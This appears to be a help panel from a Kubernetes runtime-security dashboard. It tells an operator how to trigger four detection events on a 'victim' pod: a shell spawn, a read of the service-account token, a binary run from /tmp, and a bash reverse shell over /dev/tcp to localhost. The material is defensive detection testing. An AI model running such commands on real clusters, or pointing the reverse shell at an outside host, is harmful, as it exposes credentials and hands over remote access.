How to generate a test event (human-run)
⚠️ Run these in your terminal — the dashboard only observes. The victim pod must be running with rtm.enforce=true.
E1 — Shell spawn (RTM-001)
kubectl exec -n shop deploy/victim -- sh -c "echo test"
E2 — SA token read (RTM-003)
kubectl exec -n shop deploy/victim -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
E3 — Binary from /tmp (RTM-005)
kubectl exec -n shop deploy/victim -- sh -c "cp /bin/sh /tmp/evil && /tmp/evil -c id"
E4 — Reverse shell (RTM-007)
kubectl exec -n shop deploy/victim -- sh -c "timeout 5 bash -i >/dev/tcp/127.0.0.1/9999 0>&1" || true
Port-forward to view this dashboard
kubectl port-forward svc/rtm-controller -n rtm-system 8000:8000
